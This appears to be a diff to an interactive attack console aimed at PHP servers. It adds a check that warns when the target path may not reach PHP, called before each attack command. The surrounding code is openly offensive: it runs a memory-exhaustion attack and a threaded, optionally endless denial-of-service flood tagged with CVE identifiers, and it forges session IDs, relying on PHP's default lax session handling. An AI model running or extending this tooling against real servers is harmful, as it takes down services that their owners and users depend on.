@@ -214,6 +214,13 @@ class Console:
         if self.target is None:
             raise RuntimeError("No target set. Use: target <url>")
 
+    def _warn_no_php(self, path):
+        if ".php" not in path and path in ("", "/"):
+            print(f"  \033[93mWarning: POST {path} may not reach PHP.\033[0m")
+            print(f"  \033[93mUse: target http://host:port/index.php\033[0m")
+            return True
+        return False
+
     def cmd_target(self, url=None):
         if url is None:
             if self.target:
@@ -282,6 +289,8 @@ class Console:
         print(f"\033[93m[CVE-2026-109618] OOM attack — {strategy}\033[0m")
         body = strategies[strategy]()
         upload_path = self.path("upload")
+        if self._warn_no_php(upload_path):
+            return
         print(f"Step 1: Baseline GET {upload_path}...")
         baseline = send(self.scheme, self.host, self.port, "GET",
                         upload_path, self.timeout, None, "oom-baseline")
@@ -377,6 +386,8 @@ class Console:
             print(f"  No cookie from server — generated {self.session_name}={sid[:8]}...")
             print(f"  (default session.use_strict_mode=0 accepts any ID)")
         upload_path = self.path("session-upload")
+        if self._warn_no_php(upload_path):
+            return
         print(f"Step 2: Baseline GET {upload_path}...")
         baseline, _ = session_request(self.scheme, self.host, self.port, "GET",
                                       upload_path, timeout=self.timeout)
@@ -465,6 +476,8 @@ class Console:
         label = f"{rounds} rounds" if rounds else "infinite — Ctrl+C to stop"
         print(f"\033[93m[CVE-2026-109619] Sustained DoS ({label}, {threads} threads)\033[0m")
         upload_path = self.path("session-upload")
+        if self._warn_no_php(upload_path):
+            return
         producer_body = multipart_producer(self.field_bytes, "candidate",
                                            part_headers=self.part_headers)
         consumer_body = multipart_consumer()
@@ -518,6 +531,8 @@ class Console:
         self.require_target()
         threads = self.dos_threads
         upload_path = self.path("session-upload")
+        if self._warn_no_php(upload_path):
+            return
         producer_body = multipart_producer(self.field_bytes, "candidate",
                                            part_headers=self.part_headers)
         consumer_body = multipart_consumer()
